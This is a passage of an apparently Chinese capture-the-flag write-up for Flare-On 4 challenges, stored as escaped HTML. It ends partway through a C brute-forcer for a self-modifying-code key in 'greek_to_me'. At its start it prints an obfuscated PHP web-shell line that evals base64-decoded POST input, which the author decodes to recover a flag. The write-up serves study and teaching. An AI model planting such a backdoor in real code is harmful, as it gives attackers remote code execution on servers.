&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x4F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x74&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x44&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x4F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x54&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6A&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x76&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x61&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x35&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x63&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x72&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x70&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x41&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x66&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6C&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x72&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x65&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x44&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x53&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6D&amp;#34;&lt;/span&gt;])) { &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_decode&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x4F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x54&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;104&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x61&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x44&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x54&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;106&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;118&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x63&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x61&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x70&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6C&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x61&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x44&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x53&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6E&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x44&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x4F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6F&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x6D&amp;#34;&lt;/span&gt;])); }

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;POST请求是什么不太清楚，但看到这些字符好像都在可见字符范围内，所以直接转成string，得到&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a11DOTthatDOTjava5crapATflareDASHonDOTcom&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把 &lt;code&gt;DOT&lt;/code&gt;，&lt;code&gt;AT&lt;/code&gt;，&lt;code&gt;DASH&lt;/code&gt; 都转成对应的符号，就拿到flag了&lt;/p&gt;
&lt;h2 id=&#34;flareon4greek_to_me&#34;&gt;[FlareOn4]greek_to_me&lt;/h2&gt;
&lt;p&gt;尝试运行一下，发现不能输入&lt;/p&gt;
&lt;p&gt;逆向，发现127.0.0.1的字样，以及socket等明显的网络通信函数&lt;/p&gt;
&lt;p&gt;直接运行的时候看一下主机端口，发现是 &lt;code&gt;127.0.0.1:2222&lt;/code&gt;，用Windows下的nc连上去就可以进行调试了&lt;/p&gt;
&lt;p&gt;SMC还是很明显的&lt;/p&gt;
&lt;p&gt;发现解SMC时仅用了第一个字节，但由于不知道里面有什么，猜测可能是对后面的字节进行验证，所以决定将程序本地复现一下，爆破解SMC的密钥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; ida_chars[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
{
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBC&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;
};

&lt;span style=&#34;color:#75715e&#34;&gt;#define HIBYTE(x) ((x &amp;amp; 0xFF00) &amp;gt;&amp;gt; 8)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; buf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;; buf&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; new_char[&lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;]; 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_char;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (buf &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ida_chars[i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a1;
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt; );
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;;                                      &lt;span style=&#34;color:#75715e&#34;&gt;// 0x79
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_char;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;;
